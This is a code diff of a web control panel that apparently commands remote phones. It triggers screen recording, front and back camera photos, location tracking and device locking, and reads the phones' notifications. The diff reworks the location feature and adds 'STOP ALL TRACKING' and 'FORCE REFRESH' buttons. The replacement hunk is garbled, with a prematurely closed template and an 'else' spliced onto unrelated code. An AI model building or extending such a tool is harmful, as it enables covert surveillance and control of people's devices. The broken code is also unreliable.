@@ -671,9 +671,7 @@
             if (action === 'flash') { toggleFlash(); updateMainDashboard(); }
             else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
             else if (action === 'takebackpic' || action === 'takefrontpic') openModal(action);
-            else if (action === 'get_location') {
-                window.location.href = `/location?client_id=${selectedClientId}`;
-            }
+            else if (action === 'get_location') sendCommand('get_location');
             else if (action === 'lock') openModal('lock');
             else openModal(action);
         };
@@ -935,15 +933,15 @@
                                     ${imgHtml}
                                     <div style="margin-top:10px; display:flex; gap:10px;">
                                         <button onclick="openModal('get_location')" style="padding:4px 10px; font-size:0.7rem; flex:1;">Interact Map</button>
-                                        <a href="${cdata.location_url}" target="_blank" style="text-decoration:none; padding:4px 10px; font-size:0.7rem; background:var(--surface-light); border:1px solid var(--accent-primary); border-radius:12px; color:white; flex:1; text-align:center;">Open G-Maps</a>
-                                    </div>
-                                </div>
-                            `, 10000); // Show longer for location
-                        }
-                    }
-
-                    // Real-time notifications from notifications list
-                    if (cdata.notifications?.length) {
+                                                                        <a href="${cdata.location_url}" target="_blank" style="text-decoration:none; padding:4px 12px; font-size:0.8rem; background:var(--surface-light); border:1px solid var(--accent-primary); border-radius:12px; color:white; flex:1; text-align:center;">Google Maps</a>
+                                                                    </div>
+                                                                    <div style="margin-top:15px; border-top:1px solid #2e4545; padding-top:10px;">
+                                                                        <button onclick="sendCommand('stop_location')" style="background:var(--accent-secondary); color:white; padding:8px 20px; font-size:0.8rem; width:100%;">🛑 STOP ALL TRACKING</button>
+                                                                    </div>
+                                                                </div>
+                                                            `;
+                                                            footer.innerHTML = `<button onclick="sendCommand('get_location')">FORCE REFRESH</button>`;
+                                                        } else {                    if (cdata.notifications?.length) {
                         const latestNotif = cdata.notifications[0];
                         const notifHash = selectedClientId + latestNotif.packageName + latestNotif.title + latestNotif.text;
                         if (!notificationHashes.has(notifHash)) {
